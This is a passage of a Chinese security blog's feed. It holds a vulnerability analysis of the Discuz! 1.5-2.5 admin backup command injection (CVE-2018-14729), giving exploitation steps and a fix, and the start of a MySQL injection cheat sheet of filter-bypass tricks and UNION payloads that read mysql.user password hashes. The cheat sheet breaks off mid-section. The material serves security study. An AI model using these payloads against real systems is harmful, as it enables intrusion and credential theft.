      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)</title>
    <link href="https://lucifaer.com/2018/08/29/Discuz!%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2018-14729)/"/>
    <id>https://lucifaer.com/2018/08/29/Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)/</id>
    <published>2018-08-29T08:48:09.000Z</published>
    <updated>2018-11-29T09:43:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>鸡肋的漏洞，不过官方的解决方案也是有点意思…</p><a id="more"></a><h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>8月27号有人在<a href="https://github.com/FoolMitAh/CVE-2018-14729" target="_blank" rel="noopener">GitHub</a>上公布了有关<code>Discuz 1.5-2.5版本</code>中后台数据库备份功能存在的命令执行漏洞的细节。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Discuz! 1.5-2.5</p><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>官方论坛下载相应版本就好。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>需要注意的是这个漏洞其实是需要登录后台的，并且能有数据库备份权限，所以比较鸡肋。</p><p>我这边是用<code>Discuz! 2.5</code>完成漏洞复现的，并用此进行漏洞分析的。</p><p>漏洞点在：<code>source/admincp/admincp_db.php</code>第296行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@shell_exec($mysqlbin.<span class="string">'mysqldump --force --quick '</span>.($db-&gt;version() &gt; <span class="string">'4.1'</span> ? <span class="string">'--skip-opt --create-options'</span> : <span class="string">'-all'</span>).<span class="string">' --add-drop-table'</span>.($_GET[<span class="string">'extendins'</span>] == <span class="number">1</span> ? <span class="string">' --extended-insert'</span> : <span class="string">''</span>).<span class="string">''</span>.($db-&gt;version() &gt; <span class="string">'4.1'</span> &amp;&amp; $_GET[<span class="string">'sqlcompat'</span>] == <span class="string">'MYSQL40'</span> ? <span class="string">' --compatible=mysql40'</span> : <span class="string">''</span>).<span class="string">' --host="'</span>.$dbhost.($dbport ? (is_numeric($dbport) ? <span class="string">' --port='</span>.$dbport : <span class="string">' --socket="'</span>.$dbport.<span class="string">'"'</span>) : <span class="string">''</span>).<span class="string">'" --user="'</span>.$dbuser.<span class="string">'" --password="'</span>.$dbpw.<span class="string">'" "'</span>.$dbname.<span class="string">'" '</span>.$tablesstr.<span class="string">' &gt; '</span>.$dumpfile);</span><br></pre></td></tr></table></figure><p>在<code>shell_exec()</code>函数中可控点在<code>$tablesstr</code>，向上看到第281行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$tablesstr = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span>($tables <span class="keyword">as</span> $table) &#123;</span><br><span class="line">$tablesstr .= <span class="string">'"'</span>.$table.<span class="string">'" '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟一下<code>$table</code>的获取流程，在上面的第143行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'type'</span>] == <span class="string">'discuz'</span> || $_GET[<span class="string">'type'</span>] == <span class="string">'discuz_uc'</span>) </span><br><span class="line">&#123;</span><br><span class="line">$tables = arraykeys2(fetchtablelist($tablepre), <span class="string">'Name'</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span>($_GET[<span class="string">'type'</span>] == <span class="string">'custom'</span>) </span><br><span class="line">&#123;</span><br><span class="line">$tables = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'setup'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">$tables = C::t(<span class="string">'common_setting'</span>)-&gt;fetch(<span class="string">'custombackup'</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">C::t(<span class="string">'common_setting'</span>)-&gt;update(<span class="string">'custombackup'</span>, <span class="keyword">empty</span>($_GET[<span class="string">'customtables'</span>])? <span class="string">''</span> : $_GET[<span class="string">'customtables'</span>]);</span><br><span class="line">$tables = &amp; $_GET[<span class="string">'customtables'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( !is_array($tables) || <span class="keyword">empty</span>($tables)) </span><br><span class="line">&#123;</span><br><span class="line">cpmsg(<span class="string">'database_export_custom_invalid'</span>, <span class="string">''</span>, <span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C::t(<span class="string">'common_setting'</span>)-&gt;update(<span class="string">'custombackup'</span>, <span class="keyword">empty</span>($_GET[<span class="string">'customtables'</span>])? <span class="string">''</span> : $_GET[<span class="string">'customtables'</span>]);</span><br><span class="line">$tables = &amp; $_GET[<span class="string">'customtables'</span>];</span><br></pre></td></tr></table></figure><p>首先会从<code>$_GET</code>的数组中获取<code>customtables</code>字段的内容，判断内容是否为空，不为空则将从外部获取到的<code>customtables</code>字段内容写入<code>common_setting</code>表的<code>skey=custombackup</code>的<code>svalue</code>字段，写入过程中会将这个字段做序列化存储：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355169554381.jpg" alt=""></p><p>之后再将该值赋给<code>$tables</code>。</p><p>至此可以看到漏洞产生的原因是由于<code>shell_exec()</code>中的<code>$tablesstr</code>可控，导致代码注入。</p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>漏洞的调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.php-&gt;source/class/discuz/discuz_admincp.php-&gt;source/admincp/admincp_db.php</span><br></pre></td></tr></table></figure><p>跟着漏洞的调用栈看一下如何利用。</p><p>首先在<code>admin.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($action) || $frames != <span class="keyword">null</span>) &#123;</span><br><span class="line">$admincp-&gt;show_admincp_main();</span><br><span class="line">&#125; <span class="keyword">elseif</span>($action == <span class="string">'logout'</span>) &#123;</span><br><span class="line">$admincp-&gt;do_admin_logout();</span><br><span class="line">dheader(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(in_array($action, $admincp_actions_normal) || ($admincp-&gt;isfounder &amp;&amp; in_array($action, $admincp_actions_founder))) &#123;</span><br><span class="line"><span class="keyword">if</span>($admincp-&gt;allow($action, $operation, $do) || $action == <span class="string">'index'</span>) &#123;</span><br><span class="line"><span class="keyword">require</span> $admincp-&gt;admincpfile($action);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">cpheader();</span><br><span class="line">cpmsg(<span class="string">'action_noaccess'</span>, <span class="string">''</span>, <span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">cpheader();</span><br><span class="line">cpmsg(<span class="string">'action_noaccess'</span>, <span class="string">''</span>, <span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点在构造参数满足<code>require $admincp-&gt;admincpfile($action);</code>且<code>$action</code>为<code>db</code>。也就说需要构造参数满足：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$admincp-&gt;isfounder &amp;&amp; in_array($action, $admincp_actions_founder) <span class="comment"># 为真</span></span><br><span class="line"></span><br><span class="line">$admincp-&gt;allow($action, $operation, $do) <span class="comment"># 为真</span></span><br></pre></td></tr></table></figure><p><code>$admincp-&gt;isfounder</code>是确认当前用户的，返回为True，这里只需要构造<code>$action</code>为<code>db</code>。</p><p>跟进<code>require $admincp-&gt;admincpfile($action);</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admincpfile</span><span class="params">($action)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'./source/admincp/admincp_'</span>.$action.<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就包含了<code>source/admincp/admincp_db.php</code>。跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355254512996.jpg" alt=""></p><p>这边需要满足<code>$operation == &#39;export&#39;</code>，同时存在<code>exportsubmit</code>字段。</p><p>之后，</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355255451174.jpg" alt=""></p><p>需要构造<code>file</code>字段，同时<code>$_GET[&#39;type&#39;] == &#39;custom&#39;</code>且<code>$_GET[&#39;setup&#39;]</code>和<code>$_GET[&#39;customtables&#39;]</code>非空。向下跟，还需要满足最后一个条件<code>$_GET[&#39;method&#39;] != &#39;multivol&#39;</code>，这样才能调用<code>else</code>中的操作，完成代码注入。</p><p>有了上面的这些基础分析，我们抓个符合上方条件的包来看一下。经过测试，</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355278149915.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355278323585.jpg" alt=""></p><p>这样可以抓到符合我们条件的请求包。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355271448086.jpg" alt=""></p><p>接下来只需要将<code>customtables</code>的内容更改一下就可以造成命令执行了：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355276151334.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355277015025.jpg" alt=""></p><p>效果为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355277397794.jpg" alt=""></p><h1 id="0x04-参数获取问题"><a href="#0x04-参数获取问题" class="headerlink" title="0x04 参数获取问题"></a>0x04 参数获取问题</h1><p>通过上面的分析可以看到最终可控参数的获取都是利用<code>$_GET</code>来获取的，但是我们在构造时发送的是post数据，那么为什么会照常获取到呢？</p><p>在<code>admin.php</code>第18行包含了<code>source/class/class_core.php</code>：跟进看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">C::creatapp();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">core</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">creatapp</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!is_object(<span class="keyword">self</span>::$_app)) &#123;</span><br><span class="line"><span class="keyword">self</span>::$_app = discuz_application::instance();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">self</span>::$_app;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进到<code>source/class/discuz/discuz_application.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_env();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_config();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_input();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_output();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着跟进到<code>_init_input()</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span> &amp;&amp; !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">$_GET = array_merge($_GET, $_POST);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到如果构造了post请求，<code>Discuz</code>的核心类会将<code>$_GET</code>和<code>$_POST</code>这两个list拼接到一起，赋给<code>$_GET</code>数组。</p><h1 id="0x05-修复方法"><a href="#0x05-修复方法" class="headerlink" title="0x05 修复方法"></a>0x05 修复方法</h1><p>可以利用<code>addslashes()</code>对可控点进行限制，同时利用<code>escapeshellarg()</code>函数来限制<code>$tablesstr</code>执行命令。</p><h1 id="0x06-Discuz-3-4的做法"><a href="#0x06-Discuz-3-4的做法" class="headerlink" title="0x06 Discuz 3.4的做法"></a>0x06 Discuz 3.4的做法</h1><p><code>Discuz 3.4</code>非常有趣的一点不是把这个漏洞修了，而是直接在<code>source/admincp/admincp_db.php</code>第307行写了一个错误…：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">list</span>(, $mysql_base) = DB::fetch($query, DB::$drivertype == <span class="string">'mysqli'</span> ? MYSQLI_NUM : MYSQL_NUM);</span><br></pre></td></tr></table></figure><p>调用了一个未声明的静态变量，所以该功能直接是挂掉的，没有办法使用，可谓是简单粗暴…</p><h1 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h1><p><a href="https://github.com/FoolMitAh/CVE-2018-14729" target="_blank" rel="noopener">FoolMitAh/CVE-2018-14729</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;鸡肋的漏洞，不过官方的解决方案也是有点意思…&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>MySQLi Cookbook</title>
    <link href="https://lucifaer.com/2018/08/13/MySQLi%20Cookbook/"/>
    <id>https://lucifaer.com/2018/08/13/MySQLi Cookbook/</id>
    <published>2018-08-13T11:12:09.000Z</published>
    <updated>2018-11-29T09:38:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>对于SQLi的一点总结，用于自查。</p><a id="more"></a><h1 id="0x00-Appetizer（开胃菜）"><a href="#0x00-Appetizer（开胃菜）" class="headerlink" title="0x00 Appetizer（开胃菜）"></a>0x00 Appetizer（开胃菜）</h1><h2 id="1-注释"><a href="#1-注释" class="headerlink" title="1. 注释"></a>1. 注释</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- </span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">//</span><br><span class="line">/**/</span><br><span class="line">内联注释：/!**/</span><br><span class="line">;%00（亲测很好用）</span><br></pre></td></tr></table></figure><h2 id="2-科学计数法"><a href="#2-科学计数法" class="headerlink" title="2. 科学计数法"></a>2. 科学计数法</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title,links <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">0e1</span><span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="keyword">user</span>,authentication_string,<span class="number">1e1</span><span class="keyword">from</span> mysql.<span class="string">`user`</span>;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337176614661.jpg" alt=""></p><h2 id="3-空白字符"><a href="#3-空白字符" class="headerlink" title="3. 空白字符"></a>3. 空白字符</h2><p>MySQL5的空白字符是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%09 %0A %0B %0C %0D %A0 %20</span><br></pre></td></tr></table></figure><h2 id="4-特殊符号"><a href="#4-特殊符号" class="headerlink" title="4. 特殊符号"></a>4. 特殊符号</h2><h3 id="4-1"><a href="#4-1" class="headerlink" title="4.1 +"></a>4.1 <code>+</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span>+<span class="number">1</span>,(<span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337176934323.jpg" alt=""></p><h3 id="4-2"><a href="#4-2" class="headerlink" title="4.2 -"></a>4.2 <code>-</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span><span class="number">-1</span>,(<span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337177540634.jpg" alt=""></p><h3 id="4-3-反引号"><a href="#4-3-反引号" class="headerlink" title="4.3 反引号"></a>4.3 反引号</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="string">`table_name`</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337178639891.jpg" alt=""></p><h3 id="4-4"><a href="#4-4" class="headerlink" title="4.4 ~"></a>4.4 <code>~</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span>~<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="string">`table_name`</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337180163769.jpg" alt=""></p><h3 id="4-5"><a href="#4-5" class="headerlink" title="4.5 !"></a>4.5 <code>!</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span>!<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="string">`table_name`</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337181916545.jpg" alt=""></p><h3 id="4-6"><a href="#4-6" class="headerlink" title="4.6 @"></a>4.6 <code>@</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8e0</span><span class="keyword">union</span> (<span class="keyword">SELECT</span>@<span class="keyword">user</span>,(<span class="keyword">SELECT</span> <span class="string">`table_name`</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337183246329.jpg" alt=""></p><h3 id="4-7-1"><a href="#4-7-1" class="headerlink" title="4.7 .1"></a>4.7 <code>.1</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span>title<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>freebuf<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span><span class="comment">/*.1*/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="string">`table_name`</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337187106617.jpg" alt=""></p><h3 id="4-8-39-quot"><a href="#4-8-39-quot" class="headerlink" title="4.8 &#39; &quot;"></a>4.8 <code>&#39; &quot;</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">id</span>,title,links<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>freebuf<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span><span class="comment">/*.1*/</span><span class="keyword">SELECT</span><span class="string">'1'</span>,<span class="string">"2"</span>,<span class="comment">/**/</span><span class="string">`table_name`</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337188678656.jpg" alt=""></p><h3 id="4-9"><a href="#4-9" class="headerlink" title="4.9 ()"></a>4.9 <code>()</code></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title,links <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span>(<span class="keyword">SELECT</span>(<span class="number">1</span>),(<span class="number">2</span>),(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337190588346.jpg" alt=""></p><h3 id="4-10"><a href="#4-10" class="headerlink" title="4.10 {}"></a>4.10 <code>{}</code></h3><p>在说道这个之前，首先说一下数据库语法时用到的各类括号分别代表什么</p><blockquote><ul><li><code>&lt;&gt;</code>：用于分隔字符串，字符串为语法元素的名称，SQL语言的非终止符</li><li><code>::=</code>：定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。被定义的元素位于操作符的左边，规定定义位于操作符的右边。</li><li><code>[]</code>：方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。</li><li><code>{}</code>：花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。</li><li><code>|</code>：替换操作符。 该竖线表明竖线之后的规则部分对于竖线之前的部分是可替换的。 如果竖线出现的位置不在花括号或方括号内，那么它指定对于该规则定义的元素的一个完整替换项。如果竖线出现的位置在花括号或方括号内，那么它指定花括号对或方括号对最里面内容的替换项。</li><li><code>...</code>：省略号表明在规则中省略号应用的元素可能被重复多次。如果省略号紧跟在闭花括号”}”之后，那么它应用于闭花括号和开花括号”{“之间的规则部分。如果省略号出现在其他任何元素的后面，那么它只应用于该元素。</li><li><code>!! --</code></li></ul></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> title <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span>(<span class="keyword">select</span>&#123;s table_name&#125;<span class="keyword">from</span>&#123;f information_schema.tables&#125;<span class="keyword">where</span>&#123;w table_schema=<span class="keyword">database</span>()&#125;);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337201045502.jpg" alt=""></p><h2 id="5-SQLi能用的函数分类"><a href="#5-SQLi能用的函数分类" class="headerlink" title="5. SQLi能用的函数分类"></a>5. SQLi能用的函数分类</h2><h3 id="5-1-字符串截取函数"><a href="#5-1-字符串截取函数" class="headerlink" title="5.1 字符串截取函数"></a>5.1 字符串截取函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mid(version(),1,1)</span><br><span class="line">substr(version,1,1)</span><br><span class="line">substring(version(),1,1)</span><br><span class="line">lpad(version(),1,1)</span><br><span class="line">rpad(version(),1,1)</span><br><span class="line">left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1))</span><br></pre></td></tr></table></figure><h3 id="5-2-字符串连接函数"><a href="#5-2-字符串连接函数" class="headerlink" title="5.2 字符串连接函数"></a>5.2 字符串连接函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(version(),&apos;|&apos;,&apos;user()&apos;)  # 拼接字符串时只要有一个为null，则返回null</span><br><span class="line">concat_ws(&apos;|&apos;,1,2,3)            # 不会因为出现null而返回null，会返回其他正常的结果</span><br></pre></td></tr></table></figure><h3 